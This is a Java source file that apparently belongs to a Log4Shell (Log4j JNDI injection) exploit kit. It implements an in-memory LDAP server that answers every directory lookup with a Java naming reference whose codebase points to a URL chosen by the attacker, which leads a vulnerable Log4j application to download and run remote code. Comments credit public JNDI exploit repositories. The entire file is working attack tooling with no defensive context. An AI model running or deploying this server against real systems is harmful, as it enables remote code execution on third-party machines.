package com.kirelcodes.log4j;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;
import java.net.InetAddress;

//Based on: https://www.programcreek.com/java-api-examples/?code=welk1n%2FJNDI-Injection-Exploit%2FJNDI-Injection-Exploit-master%2Fsrc%2Fmain%2Fjava%2Fjndi%2FLDAPRefServer.java
//And: https://github.com/ilsubyeega/log4j2-exploits/blob/main/ldap-server/index.js
public class Server {
	public static void run(String host, int port, String codeBase) throws Exception{
		InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(
				"dc=example,dc=com"
		);
		config.setListenerConfigs(new InMemoryListenerConfig(
				"listen",
				InetAddress.getByName(host),
				port,
				ServerSocketFactory.getDefault(),
				SocketFactory.getDefault(),
				(SSLSocketFactory)SSLSocketFactory.getDefault()
		));
		config.addInMemoryOperationInterceptor(new InMemoryOperationInterceptor() {
			@Override
			public void processSearchResult( InMemoryInterceptedSearchResult result) {
				try{
					String key = result.getRequest().getBaseDN();
					System.out.println(key);

					Entry e = new Entry(key);
					e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
					e.addAttribute("javaClassName", key);
					e.addAttribute("javaFactory", key);
					e.addAttribute("javaCodebase", codeBase);
					System.out.println(e);
					result.sendSearchEntry(e);
					result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
				} catch (Exception e){
					e.printStackTrace();
				}
			}
		});
		InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);

		ds.startListening();
	}
}
